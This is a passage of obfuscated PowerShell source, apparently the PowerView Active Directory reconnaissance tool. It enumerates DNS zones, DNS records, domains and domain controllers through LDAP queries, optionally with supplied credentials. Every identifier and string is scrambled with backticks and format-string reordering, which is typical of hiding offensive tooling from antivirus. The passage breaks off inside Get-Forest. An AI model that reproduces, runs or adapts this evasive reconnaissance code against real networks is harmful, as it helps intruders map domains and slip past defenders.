            [Int]${iNd`eX} =  2
            [String]${NA`mE}  = ''

            while (${S`Egmen`Ts}-- -gt 0)
            {
                [Int]${SE`GMENTL`ENG`Th} = ${R`AW}[${In`DEX}++]
                while (${S`E`GmEnTLeNG`TH}-- -gt 0) {
                    ${NA`ME} += [Char]${r`AW}[${InD`Ex}++]
                }
                ${na`mE} += "."
            }
            ${n`Ame}
        }
    }

    PROCESS {
        
        ${rD`AT`At`ype} =   ( ChILdItEm ("{3}{2}{1}{0}" -f 'Od',':6uM','bLe','VaRIA') )."v`ALuE"::("{0}{1}"-f'T','oUInt16').Invoke(${dNsRe`CO`RD}, 2)
        ${UpdAtE`DAT`SE`RiaL} =   ${6U`m`Od}::("{0}{1}" -f 'ToUInt','32').Invoke(${DNs`REC`ORD}, 8)

        ${t`TLraW} = ${DnS`R`ecORd}[12..15]

        
        ${nu`LL} =   ( vAriabLE  ("16"+"s")  )."v`ALue"::("{1}{0}"-f'verse','Re').Invoke(${t`TLraW})
        ${t`TL} =  ${6`Um`od}::("{0}{2}{1}"-f 'T','t32','oUIn').Invoke(${TtLR`Aw}, 0)

        ${a`ge} =   ( vArIABLe  ("{1}{0}" -f'mOd','6U')  -vAluEO)::("{1}{0}"-f'oUInt32','T').Invoke(${d`Ns`RecoRd}, 20)
        if (${a`GE} -ne 0) {
            ${TIm`eStA`mP} = ((&("{0}{1}" -f'Get-Da','te') -Year 1601 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0).("{0}{1}{2}" -f'A','ddHour','s').Invoke(${A`ge})).("{2}{1}{0}" -f'g','in','ToStr').Invoke()
        }
        else {
            ${tI`Me`StAMp} = ("{2}{0}{1}" -f'sta','tic]','[')
        }

        ${dNsreCO`R`DO`Bje`Ct} = &("{1}{0}{2}" -f'e','N','w-Object') ("{1}{0}{2}"-f'O','PS','bject')

        if (${rD`Ata`TYPe} -eq 1) {
            ${Ip} = "{0}.{1}.{2}.{3}" -f ${DN`s`R`ecoRD}[24], ${DnS`RE`CoRd}[25], ${Dn`sRE`COrD}[26], ${Dns`Rec`orD}[27]
            ${Da`Ta} = ${i`P}
            ${dNs`Rec`ordOB`jeCt} | &("{2}{1}{0}"-f'mber','Me','Add-') ("{1}{2}{0}"-f 'y','Notepro','pert') ("{2}{0}{1}" -f'cordTy','pe','Re') 'A'
        }

        elseif (${rDat`A`TypE} -eq 2) {
            ${nsN`AMe} = &("{0}{2}{1}"-f'G','e','et-Nam') ${D`NsRE`cO`RD}[24..${d`NSrEc`ORd}."Le`NGTH"]
            ${DA`TA} = ${nsNA`me}
            ${D`NsRE`c`ORdobJecT} | &("{0}{1}{2}"-f'Add-Memb','e','r') ("{1}{2}{0}" -f'operty','Not','epr') ("{0}{2}{1}"-f'RecordT','e','yp') 'NS'
        }

        elseif (${RdAtA`T`ype} -eq 5) {
            ${Al`iAS} = &("{1}{2}{0}" -f'Name','Get','-') ${dn`sr`e`CoRd}[24..${DN`sR`ecO`RD}."LEn`GTH"]
            ${DA`TA} = ${A`LIas}
            ${dnsr`Ecordo`Bj`Ect} | &("{0}{2}{1}" -f'Add-Me','ber','m') ("{1}{0}{2}" -f'o','Notepr','perty') ("{0}{3}{2}{1}"-f 'Re','dType','or','c') ("{0}{1}" -f'CNAM','E')
        }

        elseif (${rdA`T`AtYPe} -eq 6) {
            
            ${d`ATa} = $( ${a2`TR}::"To`BAS`E64`strInG"(${DnsrEc`O`Rd}[24..${D`N`SrEc`ORd}."l`eN`GtH"]))
            ${D`NSr`eC`ordObjEct} | &("{1}{0}{2}"-f'Memb','Add-','er') ("{0}{1}{2}{3}"-f'No','t','e','property') ("{3}{2}{0}{1}" -f 'ordT','ype','c','Re') 'SOA'
        }

        elseif (${R`Da`TAtypE} -eq 12) {
            ${P`TR} = &("{1}{0}" -f'Name','Get-') ${Dn`S`REcord}[24..${D`Ns`RecorD}."L`E`NgTH"]
            ${dA`TA} = ${p`TR}
            ${d`NSR`EcORd`ob`jECT} | &("{2}{0}{3}{1}"-f'dd','er','A','-Memb') ("{1}{2}{0}" -f 'erty','Notepr','op') ("{1}{0}{2}" -f 'cordTy','Re','pe') 'PTR'
        }

        elseif (${RDATA`Ty`Pe} -eq 13) {
            
            ${da`Ta} = $(  (GcI  ('vAri'+'aB'+'lE:A2TR'))."V`ALue"::"TOb`A`SE64STr`iNG"(${d`Nsr`ecoRd}[24..${d`NSRe`COrD}."leNg`Th"]))
            ${DnsrECor`do`BJect} | &("{0}{2}{1}" -f 'A','r','dd-Membe') ("{1}{2}{0}"-f'erty','Notepro','p') ("{2}{0}{1}"-f'c','ordType','Re') ("{0}{1}" -f'HINF','O')
        }

        elseif (${RD`ATATy`pE} -eq 15) {
            
            ${D`AtA} = $( ( vaRiABLE  ("a2"+"tr") -VaLu  )::"TO`BA`sE64`sTrING"(${dnS`R`e`CoRd}[24..${D`NSRe`CORD}."LENG`Th"]))
            ${dNS`R`EcOr`Dobje`cT} | &("{0}{1}{2}" -f'A','d','d-Member') ("{0}{2}{3}{1}" -f'Note','y','pro','pert') ("{3}{1}{2}{0}"-f 'pe','d','Ty','Recor') 'MX'
        }

        elseif (${R`d`At`ATyPe} -eq 16) {
            [string]${T`xT}  = ''
            [int]${segm`e`NT`l`ENgtH} = ${DnSRE`C`orD}[24]
            ${iND`ex} = 25

            while (${sEG`mE`NTL`eng`Th}-- -gt 0) {
                ${t`xT} += [char]${Dn`sreC`ORD}[${i`N`DeX}++]
            }

            ${Da`TA} = ${T`xT}
            ${d`NsrEcOR`DOb`J`Ect} | &("{1}{2}{3}{0}" -f'mber','A','dd-M','e') ("{0}{1}{2}"-f'Notepr','oper','ty') ("{1}{0}{2}"-f'eco','R','rdType') 'TXT'
        }

        elseif (${rD`AtATY`PE} -eq 28) {
            
            ${dA`Ta} = $( (  VAriaBlE ("{1}{0}" -f'R','a2T') -VaLUeonL )::"tobA`SE64St`RI`Ng"(${Dn`SrE`CorD}[24..${D`N`SrECOrd}."LenG`Th"]))
            ${dNsRecoR`dObJe`CT} | &("{2}{0}{1}" -f'd-M','ember','Ad') ("{1}{2}{0}"-f'roperty','No','tep') ("{0}{2}{3}{1}"-f 'Recor','e','dT','yp') ("{0}{1}" -f'A','AAA')
        }

        elseif (${RdaT`AtY`pe} -eq 33) {
            
            ${d`ATa} = $(  (  GEt-VAriaBLe ("{1}{0}"-f 'TR','a2') )."v`ALuE"::"Tob`A`se6`4STRiNG"(${dn`sreCO`RD}[24..${D`NS`RECord}."leN`g`Th"]))
            ${dn`Sr`e`CO`RDobje`ct} | &("{2}{0}{1}"-f'-M','ember','Add') ("{1}{2}{0}" -f 'y','Note','propert') ("{2}{3}{0}{1}" -f'rdTyp','e','R','eco') 'SRV'
        }

        else {
            ${DA`Ta} = $( ${A`2tr}::"tobAs`E`64STR`i`Ng"(${dNSREC`O`Rd}[24..${DnSrec`O`RD}."l`e`NgTH"]))
            ${dNsRECo`RdoB`Je`cT} | &("{0}{2}{1}"-f'Add-M','mber','e') ("{2}{3}{0}{1}"-f'proper','ty','Not','e') ("{2}{1}{0}"-f 'e','dTyp','Recor') ("{1}{0}"-f'OWN','UNKN')
        }

        ${D`NsRE`CORdo`BJ`ECT} | &("{0}{2}{1}" -f 'Add-','er','Memb') ("{2}{0}{1}{3}"-f'otepr','opert','N','y') ("{1}{2}{3}{0}{4}"-f'i','Upda','te','dAtSer','al') ${UpdA`TEd`AtSeRiAl}
        ${dnSR`eC`oRd`obJ`e`ct} | &("{1}{0}{2}" -f 'em','Add-M','ber') ("{2}{0}{1}"-f'pe','rty','Notepro') 'TTL' ${T`TL}
        ${D`N`SrECordo`BJ`ECT} | &("{3}{2}{0}{1}" -f'emb','er','M','Add-') ("{3}{0}{1}{2}" -f 'teprope','r','ty','No') 'Age' ${A`Ge}
        ${D`NSreco`Rdo`BJect} | &("{0}{2}{1}" -f 'Add-Memb','r','e') ("{0}{1}{3}{2}"-f'Notep','ro','ty','per') ("{1}{3}{2}{0}" -f'p','Time','m','Sta') ${tiMEST`A`mP}
        ${dn`s`RE`c`Ord`obJECt} | &("{0}{1}{2}" -f 'A','dd-Membe','r') ("{0}{2}{1}" -f 'N','erty','oteprop') ("{1}{0}"-f 'a','Dat') ${dA`Ta}
        ${dn`sRe`coRdoBj`ECT}
    }
}


function ge`T`-d`OMai`NdNSzonE {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{1}{0}{2}"-f'o','SSh','uldProcess','P'}, '')]
    [OutputType({"{1}{0}{2}{3}"-f'owerV','P','i','ew.DNSZone'})]
    [CmdletBinding()]
    Param(
        [Parameter(POsITIoN = 0, vALUEFRoMPipeLINe = ${T`Rue})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${D`OmaIN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{3}{1}{2}{4}" -f'Do','inCon','trol','ma','ler'})]
        [String]
        ${sE`RV`Er},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${p`ROp`ErTies},

        [ValidateRange(1, 10000)]
        [Int]
        ${REsultpaG`e`s`izE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SE`R`V`E`RTiMeLImit},

        [Alias({"{1}{2}{0}"-f'One','R','eturn'})]
        [Switch]
        ${FI`Ndo`Ne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cr`e`dEntiAL} =  ${Q`Fn}::"EM`PTy"
    )

    PROCESS {
        ${SeaRc`H`erARg`UM`e`NTs} = @{
            ("{2}{0}{1}"-f'AP','Filter','LD') = (("{5}{0}{6}{4}{2}{1}{3}" -f 'jec','Zon','ass=dns','e)','l','(ob','tC'))
        }
        if (${psb`O`U`N`DPara`METeRS}[("{1}{0}" -f 'main','Do')]) { ${Sea`RCH`erARG`U`Me`NtS}[("{0}{1}"-f'Doma','in')] = ${D`oMA`IN} }
        if (${p`sBoUnDPa`RAM`eteRS}[("{1}{0}" -f'erver','S')]) { ${s`EaR`CHErA`Rg`UmEntS}[("{2}{1}{0}" -f'er','erv','S')] = ${s`ER`VER} }
        if (${pSb`O`UNDPA`RaMe`TErS}[("{2}{1}{0}"-f 'ies','rt','Prope')]) { ${SEaR`C`HErargu`mEnTS}[("{0}{2}{1}" -f 'Prop','rties','e')] = ${pROp`e`Rti`eS} }
        if (${PsBOU`ND`PaR`AMetE`RS}[("{2}{1}{0}"-f 'eSize','Pag','Result')]) { ${sea`RCherARGu`Me`NTS}[("{3}{1}{0}{2}"-f'PageS','sult','ize','Re')] = ${r`eSul`T`pAG`eSIZe} }
        if (${PSB`OU`NDp`ArAMeterS}[("{1}{4}{0}{2}{3}" -f 'rTime','Ser','Li','mit','ve')]) { ${s`E`ARchErar`gU`MeNTs}[("{3}{1}{4}{0}{2}" -f 'Li','verT','mit','Ser','ime')] = ${SERVERT`i`me`l`iMIT} }
        if (${psbounDp`A`Ra`meT`Ers}[("{2}{1}{0}"-f 'ial','redent','C')]) { ${S`EaRcHEr`ArG`Um`EnTS}[("{2}{1}{0}" -f'ntial','rede','C')] = ${cREde`NTi`AL} }
        ${D`Nss`EARcHeR1} = &("{3}{1}{2}{5}{0}{4}" -f'earche','-','D','Get','r','omainS') @SearcherArguments

        if (${D`NSsE`AR`cher1}) {
            if (${PSb`o`UN`dpara`meTERs}[("{0}{1}{2}" -f 'Fin','d','One')]) { ${reSUl`Ts} = ${dnsSEa`RC`h`ER1}.("{2}{0}{1}" -f'dOn','e','Fin').Invoke()  }
            else { ${R`ES`UltS} = ${D`N`ssEARC`H`Er1}.("{0}{1}"-f 'FindA','ll').Invoke() }
            ${R`Esul`TS} | &("{0}{1}{2}"-f 'Where','-Obje','ct') {${_}} | &("{2}{1}{0}{4}{3}" -f'O','ach-','ForE','ct','bje') {
                ${O`UT} = &("{0}{4}{5}{1}{3}{2}"-f'Conv','A','roperty','PP','ert-L','D') -Properties ${_}."Pr`oPe`RtiEs"
                ${o`UT} | &("{1}{0}{2}"-f '-','Add','Member') ("{2}{1}{0}"-f 'perty','Pro','Note') ("{0}{2}{1}" -f 'ZoneNa','e','m') ${o`UT}."NA`mE"
                ${O`UT}."PsOB`j`Ect"."t`yPenAm`es".("{0}{1}" -f'I','nsert').Invoke(0, ("{0}{3}{4}{1}{2}"-f'P','N','SZone','owerVie','w.D'))
                ${O`Ut}
            }

            if (${Re`s`Ults}) {
                try { ${re`SuL`Ts}.("{0}{1}" -f 'dis','pose').Invoke() }
                catch {
                    &("{1}{4}{0}{3}{2}" -f'-Ver','Writ','se','bo','e') ('[Get-D'+'omainDF'+'SSh'+'are] '+'Erro'+'r '+'d'+'i'+'sposing '+'o'+'f '+'t'+'he '+'Re'+'sults'+' '+'obje'+'ct:'+' '+"$_")
                }
            }
            ${D`N`ssEa`RcH`Er1}.("{0}{1}{2}"-f'd','is','pose').Invoke()
        }

        ${SeaR`CHErA`R`GU`M`EntS}[("{3}{4}{0}{1}{2}"-f'sePr','e','fix','Search','Ba')] = ("{8}{0}{5}{6}{7}{3}{4}{1}{9}{2}" -f 'Micr','nD','s','DC=Doma','i','os','oftDN','S,','CN=','nsZone')
        ${DN`S`seAr`CH`Er2} = &("{4}{0}{5}{2}{1}{3}"-f 'D','r','mainSea','cher','Get-','o') @SearcherArguments

        if (${DN`Ssear`c`hER2}) {
            try {
                if (${PsBoUnDpaRAm`et`E`Rs}[("{2}{1}{0}"-f'e','indOn','F')]) { ${R`ESu`LtS} = ${d`Ns`sEA`RCheR2}.("{1}{0}" -f'dOne','Fin').Invoke() }
                else { ${reSU`L`TS} = ${D`N`sse`ARC`HeR2}.("{0}{2}{1}"-f 'Find','l','Al').Invoke() }
                ${rE`sUl`Ts} | &("{1}{2}{0}{3}" -f'-O','Wh','ere','bject') {${_}} | &("{4}{1}{3}{2}{0}" -f 't','rEach-','jec','Ob','Fo') {
                    ${O`UT} = &("{1}{2}{0}{3}{4}"-f't-LDAP','Conve','r','Pro','perty') -Properties ${_}."PROP`eR`TieS"
                    ${o`UT} | &("{1}{2}{0}"-f'd-Member','A','d') ("{2}{3}{0}{1}" -f 't','y','N','oteProper') ("{0}{1}{2}" -f'Zon','eN','ame') ${o`UT}."Na`ME"
                    ${O`Ut}."p`SOb`JECT"."TYPEN`Am`Es".("{0}{1}"-f'Inser','t').Invoke(0, ("{3}{0}{1}{2}"-f'werView.D','NSZ','one','Po'))
                    ${o`UT}
                }
                if (${rEsuL`Ts}) {
                    try { ${rE`SUl`TS}.("{0}{1}"-f 'disp','ose').Invoke() }
                    catch {
                        &("{1}{2}{3}{0}"-f'rbose','Writ','e-V','e') ('[Get-D'+'omai'+'nDNSZo'+'n'+'e] '+'E'+'r'+'ror '+'dis'+'posi'+'ng'+' '+'of'+' '+'th'+'e '+'R'+'esu'+'lts '+'ob'+'jec'+'t: '+"$_")
                    }
                }
            }
            catch {
                &("{4}{1}{3}{2}{0}" -f 'erbose','ri','V','te-','W') ((("{17}{7}{14}{4}{5}{13}{10}{6}{9}{16}{18}{11}{15}{8}{1}{19}{0}{3}{20}{2}{21}{12}"-f'nD','om','ne','nsZ','Zo','ne] Err','=','mai','D','Mic','accessing Br7CN','DN','r7','or ','nDNS','S,DC=','roso','[Get-Do','ft','ai','o','sB'))."rE`PLaCE"(([ChAr]66+[ChAr]114+[ChAr]55),[StriNg][ChAr]39))
            }
            ${dnS`SEarCHe`R2}.("{0}{1}" -f'dispos','e').Invoke()
        }
    }
}


function G`et-d`Om`A`IN`DnsreCORd {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{4}{1}{2}{0}" -f 's','uldProce','s','PSSh','o'}, '')]
    [OutputType({"{2}{1}{4}{5}{3}{0}"-f'ord','erView.D','Pow','c','NSR','e'})]
    [CmdletBinding()]
    Param(
        [Parameter(PositIon = 0,  mANdatORy = ${t`RUE}, vALuEfRompiPeLine = ${T`RUE}, ValuEfrompipELINebypROpERtYNaME = ${tr`UE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${ZO`NENA`Me},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`OM`AiN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{4}{2}{3}{1}"-f'D','ler','ainCon','trol','om'})]
        [String]
        ${s`e`RveR},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${ProP`eRt`I`Es} = ("{12}{2}{10}{0}{5}{1}{9}{8}{4}{6}{7}{3}{13}{11}" -f'd','ame,','dist','ed,w','hencr','n','ea','t','ord,w','dnsrec','inguishe','anged','name,','hench'),

        [ValidateRange(1, 10000)]
        [Int]
        ${R`EsUl`T`PagesiZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SERvE`RTi`M`el`iM`IT},

        [Alias({"{0}{1}{2}" -f'Ret','ur','nOne'})]
        [Switch]
        ${f`INd`one},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cr`Ed`ent`iAl} =  (item  ("vARI"+"ABL"+"e"+":qFn")  )."VA`LuE"::"EMP`Ty"
    )

    PROCESS {
        ${s`eARc`HER`ARG`UMEnTS} = @{
            ("{0}{2}{1}{3}" -f'L','AP','D','Filter') = ("{3}{2}{1}{4}{0}{5}"-f 'e','ss=dnsNo','bjectCla','(o','d',')')
            ("{0}{3}{2}{1}" -f'Se','asePrefix','chB','ar') = "DC=$($ZoneName),CN=MicrosoftDNS,DC=DomainDnsZones"
        }
        if (${Ps`B`OunD`pARAMEtERs}[("{0}{1}" -f'Doma','in')]) { ${se`A`R`cHErargumEN`Ts}[("{1}{0}"-f'main','Do')] = ${D`o`mAIn} }
        if (${pSB`ounD`P`ARAmE`TeRs}[("{0}{1}" -f'Serv','er')]) { ${sEa`R`CherAR`gumen`TS}[("{1}{0}{2}"-f'erv','S','er')] = ${Se`R`VeR} }
        if (${PsBoUNdp`A`R`AM`Ete`Rs}[("{2}{1}{0}"-f'erties','p','Pro')]) { ${S`eA`RcHEr`ArGU`mENtS}[("{1}{0}{2}" -f'ropert','P','ies')] = ${Pro`PertI`es} }
        if (${P`SBOuND`P`ArAMeTers}[("{1}{0}{2}"-f 'sultPag','Re','eSize')]) { ${SEAr`ChErArG`UMeN`TS}[("{0}{2}{1}" -f'Result','ze','PageSi')] = ${re`s`U`ltpa`GEsIZe} }
        if (${pSbO`Und`PArAME`Ters}[("{4}{1}{0}{3}{2}" -f'Time','r','imit','L','Serve')]) { ${SEA`RCHER`ARguM`enTS}[("{0}{2}{4}{1}{3}" -f'Serv','m','e','eLimit','rTi')] = ${sE`RVeRTiMEL`I`mIT} }
        if (${psbOuNDP`AR`A`meTERS}[("{3}{2}{0}{1}"-f 'entia','l','ed','Cr')]) { ${sE`ARc`HeRa`RGuMENTS}[("{1}{2}{0}" -f 'l','Credenti','a')] = ${cR`edEn`TiAL} }
        ${dnsse`Ar`cH`ER} = &("{0}{1}{2}{3}" -f 'Get-Domai','n','Searc','her') @SearcherArguments

        if (${D`Ns`SEa`RChEr}) {
            if (${pSbouND`p`A`RaMe`Ters}[("{1}{2}{0}" -f 'One','Fi','nd')]) { ${r`EsulTs} = ${DnS`SeaRc`HeR}.("{2}{0}{1}" -f'n','e','FindO').Invoke() }
            else { ${re`SuLtS} = ${dnss`eAR`c`hER}.("{2}{1}{0}" -f'l','ndAl','Fi').Invoke() }
            ${R`ESUL`Ts} | &("{1}{2}{0}"-f't','Where-Obje','c') {${_}} | &("{2}{1}{0}" -f 'ct','Each-Obje','For') {
                try {
                    ${o`UT} = &("{4}{0}{6}{5}{1}{3}{2}" -f 've','Pro','erty','p','Con','P','rt-LDA') -Properties ${_}."p`ROp`eRtiEs" | &("{0}{1}{2}" -f'Se','lect-O','bject') ("{1}{0}"-f 'e','nam'),("{1}{3}{2}{0}" -f 'e','dist','guishednam','in'),("{0}{1}" -f 'dnsreco','rd'),("{0}{2}{1}"-f 'wh','reated','enc'),("{0}{1}{2}" -f 'whench','ange','d')
                    ${o`Ut} | &("{2}{1}{0}{3}"-f 'm','-Me','Add','ber') ("{1}{0}{2}"-f'per','NotePro','ty') ("{2}{1}{0}"-f 'Name','ne','Zo') ${zon`EnAmE}

                    
                    if (${O`Ut}."dNS`REc`Ord" -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                        
                        ${R`e`cORd} = &("{0}{1}{3}{2}"-f'Con','ver','NSRecord','t-D') -DNSRecord ${O`Ut}."DN`s`Record"[0]
                    }
                    else {
                        ${Re`CORd} = &("{1}{3}{2}{0}"-f'd','C','or','onvert-DNSRec') -DNSRecord ${O`UT}."D`NSREcO`RD"
                    }

                    if (${rE`CO`Rd}) {
                        ${r`ECo`RD}."Pso`B`JeCT"."PR`opeR`TIes" | &("{1}{0}{2}"-f'ch-Obje','ForEa','ct') {
                            ${O`Ut} | &("{3}{1}{2}{0}"-f 'r','Mem','be','Add-') ("{1}{2}{0}{3}"-f 't','NoteP','roper','y') ${_}."nA`mE" ${_}."v`ALue"
                        }
                    }

                    ${O`UT}."PsOb`je`cT"."tY`peNaM`ES".("{1}{0}" -f'nsert','I').Invoke(0, ("{5}{4}{0}{1}{3}{2}"-f 'iew','.','ord','DNSRec','erV','Pow'))
                    ${o`UT}
                }
                catch {
                    &("{0}{1}{2}"-f 'W','rite-W','arning') ('[Get-Do'+'ma'+'inDN'+'S'+'Reco'+'rd] '+'Er'+'ror: '+"$_")
                    ${O`UT}
                }
            }

            if (${rE`su`ltS}) {
                try { ${rES`U`Lts}.("{0}{1}" -f'dispos','e').Invoke() }
                catch {
                    &("{1}{0}{2}{3}"-f'rite','W','-Verbo','se') ('['+'Get-Do'+'m'+'ain'+'DNSRecord] '+'Er'+'ror'+' '+'di'+'sp'+'osin'+'g '+'of'+' '+'th'+'e '+'Re'+'s'+'ults '+'ob'+'ject'+': '+"$_")
                }
            }
            ${dN`SsE`ArC`her}.("{0}{1}"-f 'dispos','e').Invoke()
        }
    }
}


function GET-D`oMA`In {


    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(POsitIOn = 0, valUeFroMPIPElIne = ${tr`Ue})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${d`o`MaIn},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cr`ED`entI`AL} =  ${q`FN}::"emP`TY"
    )

    PROCESS {
        if (${p`sBOUnd`pA`R`AM`eTerS}[("{1}{0}{2}"-f'n','Crede','tial')]) {

            &("{2}{0}{1}" -f '-Verbos','e','Write') ("{2}{6}{8}{4}{1}{3}{7}{0}{5}"-f'Get-Do','ing al','[Get','ternate crede','] Us','main','-Doma','ntials for ','in')

            if (${pSBOuND`Pa`R`Am`EtE`RS}[("{0}{1}"-f'Doma','in')]) {
                ${Ta`Rg`ETDO`mAIN} = ${do`main}
            }
            else {
                
                ${ta`RGet`DOma`iN} = ${c`ReDent`ial}.("{4}{3}{5}{0}{1}{2}" -f 'ede','ntia','l','etNetworkC','G','r').Invoke()."DOMa`iN"
                &("{1}{0}{2}" -f 's','Write-Verbo','e') ('[Get'+'-Domain'+']'+' '+'Extr'+'act'+'ed '+'domai'+'n '+"'$TargetDomain' "+'from'+' '+'-C'+'r'+'ed'+'ential')
            }

            ${d`OmAInC`On`TeXt} = &("{1}{0}{2}"-f '-Ob','New','ject') ("{11}{6}{0}{2}{3}{5}{1}{10}{4}{14}{12}{9}{15}{8}{13}{7}" -f'to','s.','r','y','i','Service','irec','t','ctor','D','Act','System.D','e','yContex','v','irectory.Dire')(("{0}{1}" -f'Doma','in'), ${taRG`eT`D`O`maiN}, ${Cr`eD`entIaL}."USEr`N`AME", ${cR`Ed`ENTi`AL}.("{3}{1}{2}{0}{4}"-f't','tNetworkCred','en','Ge','ial').Invoke()."PAss`W`orD")

            try {
                 (  Dir ("VA"+"riABLE:"+"wqy"+"Knb"))."val`Ue"::("{0}{1}" -f'GetDoma','in').Invoke(${D`o`main`CO`NteXT})
            }
            catch {
                &("{2}{0}{1}" -f 'V','erbose','Write-') ('[Ge'+'t'+'-Domai'+'n] '+'Th'+'e '+'s'+'pec'+'if'+'ied '+'domai'+'n '+"'$TargetDomain' "+'do'+'es '+'not'+' '+'exi'+'st, '+'co'+'uld '+'n'+'ot '+'be'+' '+'c'+'ont'+'acted, '+'the'+'re'+' '+(('is'+'nTRDt'+' ') -CrePlACe([cHAr]84+[cHAr]82+[cHAr]68),[cHAr]39)+'a'+'n '+'e'+'x'+'i'+'sting '+'tr'+'us'+'t, '+'o'+'r '+'the'+' '+'s'+'peci'+'fied '+'crede'+'ntials'+' '+'ar'+'e '+'inv'+'al'+'id: '+"$_")
            }
        }
        elseif (${pSb`o`Un`Dp`ArAME`TErs}[("{0}{1}"-f 'Doma','in')]) {
            ${d`OMa`iNcONTe`XT} = &("{1}{0}{3}{2}" -f'e','N','t','w-Objec') ("{9}{5}{0}{3}{11}{1}{4}{12}{2}{8}{10}{6}{7}"-f'ctoryServi','tiveD','ire','ces','irectory.','.Dire','Co','ntext','ct','System','ory','.Ac','D')(("{1}{0}" -f'n','Domai'), ${d`oMA`In})
            try {
                 (  cHILDiTEm  ('v'+'ARia'+'BlE:WqyKNB')  )."Val`Ue"::("{0}{1}{2}" -f'Get','Do','main').Invoke(${DO`M`AiNCoNtE`xt})
            }
            catch {
                &("{1}{0}{2}" -f 'o','Write-Verb','se') ('[Get'+'-D'+'omain] '+'T'+'he '+'spec'+'ifi'+'ed '+'do'+'ma'+'in '+"'$Domain' "+'does'+' '+'not'+' '+'e'+'xist'+', '+'c'+'oul'+'d '+'not'+' '+'b'+'e '+'cont'+'ac'+'ted, '+'o'+'r '+'there'+' '+('is'+'n'+'{0}'+'t ')-F [cHAr]39+'an'+' '+'ex'+'isti'+'n'+'g '+'tr'+'u'+'st '+': '+"$_")
            }
        }
        else {
            try {
                  (ItEm  ('va'+'riab'+'le'+':w'+'QYKnB'))."VA`Lue"::("{3}{4}{1}{0}{2}"-f 'tDoma','Curren','in','Ge','t').Invoke()
            }
            catch {
                &("{0}{2}{4}{1}{3}"-f 'Wr','o','it','se','e-Verb') ('[G'+'et'+'-Domain] '+'Er'+'r'+'or '+'r'+'etrieving'+' '+'th'+'e '+'cur'+'rent '+'domai'+'n: '+"$_")
            }
        }
    }
}


function ge`T-DOmainC`o`NtRoL`ler {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{2}{3}{0}{4}" -f 'es','PSSh','ouldPro','c','s'}, '')]
    [OutputType({"{3}{0}{4}{2}{1}" -f 'i','er','.Comput','PowerV','ew'})]
    [OutputType({"{11}{4}{5}{6}{7}{10}{16}{15}{3}{17}{0}{13}{8}{12}{9}{14}{1}{2}"-f 'i','nCo','ntroller','e','yste','m.D','i','r','to','y.Do','ectoryS','S','r','rec','mai','rvic','e','s.ActiveD'})]
    [CmdletBinding()]
    Param(
        [Parameter(positIoN = 0, vAlueFRoMPIPEliNe = ${T`Rue})]
        [String]
        ${DOm`A`iN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{3}{2}{1}{0}" -f'ontroller','C','in','a','Dom'})]
        [String]
        ${SerV`eR},

        [Switch]
        ${L`dAP},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`RedeN`T`iAL} =   (  geT-vArIaBlE  ("qf"+"n") -VA  )::"E`mpTY"
    )

    PROCESS {
        ${arG`UM`eNtS} = @{}
        if (${PsbO`U`NDPaRAmE`TERs}[("{1}{0}"-f 'ain','Dom')]) { ${a`RG`UMENTs}[("{1}{0}" -f 'n','Domai')] = ${dOm`AIn} }
        if (${p`s`Bo`U`NDparaMetE`Rs}[("{1}{2}{0}"-f'al','Cre','denti')]) { ${a`Rg`UmeNtS}[("{2}{1}{0}" -f'ial','edent','Cr')] = ${crED`ENT`i`Al} }

        if (${p`SBou`NDpARAmet`e`RS}[("{1}{0}"-f'DAP','L')] -or ${p`sb`OUnDp`ArA`Meters}[("{1}{0}"-f 'r','Serve')]) {
            if (${pSbOu`NDPa`RAMeTE`RS}[("{1}{0}{2}" -f'e','S','rver')]) { ${aRGume`N`TS}[("{0}{1}" -f'Serve','r')] = ${sE`R`VeR} }

            
            ${ARgU`M`ENTs}[("{2}{1}{0}"-f 'ter','PFil','LDA')] = ("{1}{0}{9}{10}{11}{8}{7}{3}{13}{4}{5}{12}{6}{2}" -f 'C','(userAccount',')','2.84','556.1.4.','80','92','l:1.','o','o','nt','r','3:=81','0.113')

            &("{4}{0}{1}{3}{2}{5}"-f 'et','-','mainComput','Do','G','er') @Arguments
        }
        else {
            ${f`oU`Nd`DOmaIn} = &("{0}{1}{2}"-f 'Get','-','Domain') @Arguments
            if (${F`ounD`DoMA`in}) {
                ${FOUnDd`oMA`iN}."Dom`Ain`Control`lers"
            }
        }
    }
}


function g`eT-`FoRe`sT {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{2}{0}{1}{4}"-f'P','r','hould','PSS','ocess'}, '')]
    [OutputType({"{6}{3}{2}{7}{0}{1}{5}{4}" -f'at','ion.','na','tem.Ma','ustomObject','PSC','Sys','gement.Autom'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOSiTioN = 0, vAlUEFrOmPIPElInE = ${TR`UE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${For`e`St},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CR`e`dENtiAl} =  (LS  ("{2}{0}{3}{1}"-f 'A','fn','vaRi','bLe:q') )."VA`LUE"::"EM`pty"
    )

    PROCESS {
        if (${pSb`oUN`dParAMet`e`RS}[("{0}{2}{3}{1}" -f 'C','ial','r','edent')]) {

